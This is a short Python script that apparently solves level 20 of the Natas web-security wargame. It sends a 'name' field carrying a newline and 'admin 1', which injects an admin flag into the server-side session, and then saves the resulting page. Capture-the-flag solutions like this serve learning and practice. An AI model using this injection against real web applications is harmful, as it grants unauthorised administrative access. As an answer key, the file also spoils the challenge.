import requests

import utils

LEVEL = 20

url, auth = utils.get_natas_credentials(LEVEL)

with requests.Session() as session:
    session.post(url, data={'name': 'test\nadmin 1'}, auth=auth)
    response = session.get(url, auth=auth)
    utils.save_file('out.txt', response.text)
